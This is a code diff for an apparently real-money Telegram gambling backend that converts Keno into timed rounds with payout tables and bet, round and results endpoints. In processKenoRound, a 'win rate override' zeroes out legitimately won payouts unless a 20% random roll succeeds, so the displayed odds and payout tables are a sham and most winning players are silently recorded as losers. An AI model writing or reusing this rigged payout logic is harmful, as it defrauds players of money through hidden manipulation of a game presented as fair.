@@ -246,31 +246,142 @@ app.post('/api/games/chicken-road/cashout', authMiddleware, (req, res) => {
   } catch (err) { console.error('CR cashout error:', err); res.status(500).json({ error: 'Server error' }); }
 });
 
-// ============ KENO ROUTE ============
-app.post('/api/games/keno/play', authMiddleware, (req, res) => {
+// ============ KENO ROUND-BASED SYSTEM ============
+const KENO_ROUND_DURATION = 60; // 60 seconds per round
+let kenoRound = {
+  id: 1,
+  bets: [],
+  startTime: Date.now(),
+  drawnNumbers: null,
+  status: 'betting' // 'betting' or 'drawn'
+};
+
+function getKenoTimeLeft() {
+  const elapsed = (Date.now() - kenoRound.startTime) / 1000;
+  return Math.max(0, Math.floor(KENO_ROUND_DURATION - elapsed));
+}
+
+function processKenoRound() {
+  // Draw 20 numbers
+  const drawn = new Set();
+  while (drawn.size < 20) {
+    drawn.add(Math.floor(Math.random() * 80) + 1);
+  }
+  kenoRound.drawnNumbers = Array.from(drawn).sort((a, b) => a - b);
+  kenoRound.status = 'drawn';
+
+  // Process all bets
+  for (const bet of kenoRound.bets) {
+    const matches = bet.picks.filter(p => kenoRound.drawnNumbers.includes(p));
+    const matchCount = matches.length;
+    const payoutTable = getKenoPayoutForRound(bet.picks.length);
+    const multiplier = payoutTable[matchCount] || 0;
+    const payout = parseFloat((bet.betAmount * multiplier).toFixed(2));
+
+    // Apply 20% win rate override
+    const shouldPlayerWin = Math.random() < 0.20;
+    let finalPayout = payout;
+    if (!shouldPlayerWin && payout > 0) {
+      finalPayout = 0; // Override to loss
+    }
+
+    if (finalPayout > 0) {
+      db.prepare('UPDATE users SET balance = balance + ?, total_won = total_won + ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(finalPayout, finalPayout, bet.userId);
+    } else {
+      db.prepare('UPDATE users SET total_lost = total_lost + ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(bet.betAmount, bet.userId);
+    }
+    db.prepare('INSERT INTO games (user_id, game_type, bet_amount, multiplier, payout, result, game_data) VALUES (?, ?, ?, ?, ?, ?, ?)')
+      .run(bet.userId, 'keno', bet.betAmount, multiplier, finalPayout, finalPayout > 0 ? 'win' : 'loss', JSON.stringify({ picks: bet.picks, drawn: kenoRound.drawnNumbers, matches, roundId: kenoRound.id }));
+    const updatedUser = db.prepare('SELECT balance FROM users WHERE id = ?').get(bet.userId);
+    db.prepare('INSERT INTO transactions (user_id, type, amount, balance_after, description) VALUES (?, ?, ?, ?, ?)')
+      .run(bet.userId, 'game', finalPayout > 0 ? finalPayout : -bet.betAmount, updatedUser.balance, `Fast Keno Round #${kenoRound.id} - ${matchCount} matches`);
+  }
+
+  // Start new round after 5 seconds
+  setTimeout(() => {
+    kenoRound = {
+      id: kenoRound.id + 1,
+      bets: [],
+      startTime: Date.now(),
+      drawnNumbers: null,
+      status: 'betting'
+    };
+  }, 5000);
+}
+
+function getKenoPayoutForRound(numPicks) {
+  const tables = {
+    1: { 0: 0, 1: 3.5 },
+    2: { 0: 0, 1: 1, 2: 8 },
+    3: { 0: 0, 1: 0, 2: 2.5, 3: 25 },
+    4: { 0: 0, 1: 0, 2: 1.5, 3: 5, 4: 50 },
+    5: { 0: 0, 1: 0, 2: 1, 3: 3, 4: 15, 5: 100 },
+    6: { 0: 0, 1: 0, 2: 0.5, 3: 2, 4: 8, 5: 50, 6: 200 },
+    7: { 0: 0, 1: 0, 2: 0, 3: 1.5, 4: 5, 5: 20, 6: 100, 7: 500 },
+    8: { 0: 0, 1: 0, 2: 0, 3: 1, 4: 3, 5: 10, 6: 50, 7: 250, 8: 1000 },
+    9: { 0: 0, 1: 0, 2: 0, 3: 0.5, 4: 2, 5: 5, 6: 25, 7: 100, 8: 500, 9: 2000 },
+    10: { 0: 0, 1: 0, 2: 0, 3: 0, 4: 1.5, 5: 3, 6: 15, 7: 50, 8: 250, 9: 1000, 10: 5000 }
+  };
+  return tables[numPicks] || tables[1];
+}
+
+// Keno round timer
+setInterval(() => {
+  if (kenoRound.status === 'betting' && getKenoTimeLeft() <= 0) {
+    processKenoRound();
+  }
+}, 1000);
+
+// Place bet in current round
+app.post('/api/games/keno/bet', authMiddleware, (req, res) => {
   try {
     const tgId = String(req.telegramUser.id);
     const { betAmount, picks } = req.body;
+    if (kenoRound.status !== 'betting') return res.status(400).json({ error: 'Round is drawing, wait for next round' });
+    if (getKenoTimeLeft() < 3) return res.status(400).json({ error: 'Too late, wait for next round' });
     if (!betAmount || betAmount < 5) return res.status(400).json({ error: 'Minimum bet is 5 ETB' });
     if (!picks || picks.length < 1 || picks.length > 10) return res.status(400).json({ error: 'Pick 1-10 numbers' });
+    for (const p of picks) { if (p < 1 || p > 80) return res.status(400).json({ error: 'Numbers must be 1-80' }); }
     const user = db.prepare('SELECT * FROM users WHERE telegram_id = ?').get(tgId);
     if (!user) return res.status(404).json({ error: 'User not found' });
     if (user.balance < betAmount) return res.status(400).json({ error: 'Insufficient balance' });
+
+    // Check if already bet this round
+    const existingBet = kenoRound.bets.find(b => b.tgId === tgId);
+    if (existingBet) return res.status(400).json({ error: 'Already placed a bet this round' });
+
     db.prepare('UPDATE users SET balance = balance - ?, total_wagered = total_wagered + ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(betAmount, betAmount, user.id);
-    const result = playKeno(betAmount, picks);
-    if (result.payout > 0) {
-      db.prepare('UPDATE users SET balance = balance + ?, total_won = total_won + ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(result.payout, result.payout, user.id);
-    } else {
-      db.prepare('UPDATE users SET total_lost = total_lost + ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(betAmount, user.id);
-    }
-    db.prepare('INSERT INTO games (user_id, game_type, bet_amount, multiplier, payout, result, game_data) VALUES (?, ?, ?, ?, ?, ?, ?)')
-      .run(user.id, 'keno', betAmount, result.multiplier, result.payout, result.result, JSON.stringify({ picks, drawn: result.drawnNumbers, matches: result.matches }));
+    kenoRound.bets.push({ userId: user.id, tgId, betAmount, picks, username: user.username || user.first_name });
     const updatedUser = db.prepare('SELECT balance FROM users WHERE id = ?').get(user.id);
-    db.prepare('INSERT INTO transactions (user_id, type, amount, balance_after, description) VALUES (?, ?, ?, ?, ?)')
-      .run(user.id, 'game', result.payout > 0 ? result.payout : -betAmount, updatedUser.balance, `Fast Keno - ${result.matchCount} matches`);
-    checkReferralBonus(user.id);
-    res.json({ ...result, balance: updatedUser.balance });
-  } catch (err) { console.error('Keno error:', err); res.status(500).json({ error: 'Server error' }); }
+    res.json({ success: true, roundId: kenoRound.id, timeLeft: getKenoTimeLeft(), balance: updatedUser.balance });
+  } catch (err) { console.error('Keno bet error:', err); res.status(500).json({ error: 'Server error' }); }
+});
+
+// Get current round status
+app.get('/api/games/keno/round', authMiddleware, (req, res) => {
+  const bets = kenoRound.bets.map(b => ({
+    username: b.username ? b.username.substring(0, 1) + '***' + b.username.slice(-1) : '***',
+    picks: b.picks,
+    betAmount: b.betAmount,
+    status: kenoRound.status === 'drawn' ? 'done' : 'Waiting'
+  }));
+  res.json({
+    roundId: kenoRound.id,
+    status: kenoRound.status,
+    timeLeft: getKenoTimeLeft(),
+    totalBets: kenoRound.bets.length,
+    bets: bets.slice(-10),
+    drawnNumbers: kenoRound.status === 'drawn' ? kenoRound.drawnNumbers : null
+  });
+});
+
+// Get last round results
+app.get('/api/games/keno/results', authMiddleware, (req, res) => {
+  const tgId = String(req.telegramUser.id);
+  const user = db.prepare('SELECT id FROM users WHERE telegram_id = ?').get(tgId);
+  if (!user) return res.status(404).json({ error: 'User not found' });
+  const lastGames = db.prepare("SELECT * FROM games WHERE user_id = ? AND game_type = 'keno' ORDER BY created_at DESC LIMIT 10").all(user.id);
+  res.json({ results: lastGames });
 });
 
 // ============ PROMO CODE ============
